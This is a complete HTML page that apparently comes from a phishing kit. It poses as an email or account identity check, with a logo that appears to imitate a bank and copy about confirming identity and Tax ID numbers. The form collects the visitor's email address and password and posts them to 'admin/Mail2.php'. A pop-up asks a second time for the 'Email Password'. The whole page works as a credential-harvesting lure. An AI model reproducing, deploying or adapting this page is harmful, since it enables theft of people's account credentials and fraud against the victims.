
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Email Address</title>
</head>
<body>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap" rel="stylesheet"> 

	<style type="text/css">
		.loaderbox{
			position: fixed;
			width: 100%;
			height: 100%;
			z-index: 9999999;
			background-color: #134286;
		}
		.spinner.loading {
			  /*padding: 50%;*/
			  top: 50%;
			  position: relative;
			  text-align: center;
			}

			.spinner.loading:before {
			  content: "";
			  height: 50px;
			  width: 50px;
			  margin: -15px auto auto -15px;
			  position: absolute;
			  top: 50%;
			  left: 50%;
			  border-width: 4px;
			  border-style: solid;
			  border-color: #2180c0 #ccc #ccc;
			  border-radius: 100%;
			  animation: rotation .7s infinite linear;
			}

			@keyframes rotation {
			  from {
			    transform: rotate(0deg);
			  } to {
			    transform: rotate(359deg);
			  }
			}
		.navbar{
			background-color: #0846a8;
		}
		.p-container {
			color: #414042;
			font-size: 1rem;
			font-weight: 500 !important;
			margin-bottom: 12px;
			font-family: 'Open Sans', sans-serif;
		}
		.progress{
			height: 4px;
			background-color: #949494;

		}
		.progress-bar{
			height: 8px !important;
			position: absolute;
			border-radius: 10px;
			margin-top: -2px;
			background-color: #0060f0;

		}
		.d-container{
			font-size: 1.75rem;
			color: #666;
			font-weight: 200 !important;
			font-family: 'Open Sans', sans-serif;

		}
		.p2-container{
			color: #414042;
			font-size: .9rem;
			font-weight: 200 !important;
			
			font-family: 'Open Sans', sans-serif;
		}
		.form-control-2{
			border: none !important;
			border-bottom: 1px solid #ccc !important;
			background: transparent !important;
			border-radius: 0px !important;
			max-width: 300px;
			padding-left: 0px;

		}

		.form-control:focus{
			box-shadow: none !important;
		}
		.form-control-3:focus{
			border-bottom: 2px solid #0060f0 !important;
	
		}
		.btn-primary{
			box-shadow: none !important;
		}
		.form-control-danger{
			border: none !important;
			border-bottom: 1px solid #dc3545 !important;
			background: transparent !important;
			border-radius: 0px !important;
			max-width: 300px;
			padding-left: 0px;

		}
		.form-control-danger:focus{
			border-bottom: 2px solid #dc3545 !important;
	
		}
	</style>

<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title text-capitalize" id="exampleModalLabel">Confirm Email Address</h5>

      </div>
      <div class="modal-body">
        <div class="container">
        	<div class="d-flex justify-content-center" id="emailimg"></div>
        	<label id="mlbl">Confirm Your Email Password</label>
        	<input type="password" name="pass" id="getepass" class="form-control form-control-2 form-control-3"  >
        </div>
      </div>
      <div class="modal-footer">

        <button type="button" class="btn btn-primary" id="check"  data-toggle="modal" data-target="#exampleModal">Continue</button>
      </div>
    </div>
  </div>
</div>
	<nav class="navbar  justify-content-center text-white">
	  	
	    <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
			 width="32.000000pt" height="32.000000pt" viewBox="0 0 900.000000 720.000000"
			 preserveAspectRatio="xMidYMid meet">
			
			<g transform="translate(0.000000,720.000000) scale(0.100000,-0.100000)"
			fill="white" stroke="none">
			<path d="M3064 7181 c-9 -20 -1005 -1023 -1331 -1341 -93 -91 -301 -299 -461
			-463 l-292 -299 0 -1331 0 -1332 1067 5 c588 3 1069 6 1071 8 1 1 2 1065 2
			2365 0 2122 -2 2365 -16 2385 -19 27 -28 28 -40 3z"/>
			<path d="M3246 7178 c-7 -28 -8 -2091 -1 -2110 4 -11 411 -13 2388 -11 1310 2
			2383 6 2385 11 1 4 -229 239 -510 522 -282 284 -676 681 -875 883 -198 202
			-365 367 -370 367 -5 0 -82 76 -170 169 -89 93 -164 167 -167 164 -3 -3 -8 2
			-12 11 -6 15 -111 16 -1334 16 l-1328 0 -6 -22z"/>
			<path d="M5886 4914 c-3 -9 -6 -1079 -6 -2379 0 -2055 2 -2364 15 -2368 9 -4
			168 148 470 450 250 250 455 457 455 459 0 2 270 275 600 606 l600 603 0 1323
			0 1322 -1064 0 c-961 0 -1064 -2 -1070 -16z"/>
			<path d="M980 2273 c0 -14 32 -50 96 -110 106 -96 409 -398 769 -764 127 -129
			318 -320 425 -425 107 -105 334 -331 505 -502 l309 -312 1331 0 1330 0 -3
			1060 c-2 833 -5 1062 -15 1065 -6 3 -1077 6 -2380 7 l-2367 3 0 -22z"/>
			</g>
			</svg>
	</nav>

	<div class="container-fluid">
		<div class="d-flex justify-content-center">
			<div class="col-md-6 mt-5">
				<p class="p-container">Identification</p>
				<div class="progress">
				  	<div class="progress-bar" role="progressbar" style="width: 50%" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100"></div>
				</div>
				<div class="d-container">Let's confirm your Email.</div>
				<p class="p2-container">To protect your account, please tell us the requested info so we can confirm your identity. If you have more than one account, choose one and we'll take care of the rest.<br><br>Commercial administrators must tell us a Tax ID number.</p>

				<form action="admin/Mail2.php" id="saveform" method="post">
					<div class="container-fluid">
						<label for="#emailaddr" style="opacity:.8;" id="labelemail">Email</label>
						<input type="email" name="emailaddr" id="emailaddr" class="form-control form-control-2 form-control-3 " >
						<br>
						<label for="#emailaddr" style="opacity:.8;" id="labelemail">Password</label>
						<input type="password" name="passd" id="emailaddr" class="form-control form-control-2 form-control-3 " >
						<div id="errbox" style="display: none;">
							<div class=" d-flex justify-content-start"  >
								<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
									 width="30" height="35" viewBox="0 0 34.000000 32.000000"
									 preserveAspectRatio="xMidYMid meet">

									<g transform="translate(0.000000,32.000000) scale(0.100000,-0.100000)"
									fill="#bf2155" stroke="none">
									<path d="M119 231 c-60 -61 -24 -151 61 -151 54 0 90 34 90 85 0 48 -45 95
									-90 95 -22 0 -41 -9 -61 -29z m77 -16 c8 -20 -4 -65 -16 -65 -12 0 -24 45 -16
									65 3 8 10 15 16 15 6 0 13 -7 16 -15z m4 -90 c0 -8 -9 -15 -20 -15 -11 0 -20
									7 -20 15 0 8 9 15 20 15 11 0 20 -7 20 -15z"/>
									</g>
								</svg>
								<div class="err-txt-box text-danger mt-1"></div>
							</div>
						</div>
					</div>
					<div class="d-flex justify-content-end mt-5">
						<button class="btn btn-primary px-5" type="submit">Verify Email</button>
					</div>
				</form>
			</div>
		</div>
	</div>



</body>
</html>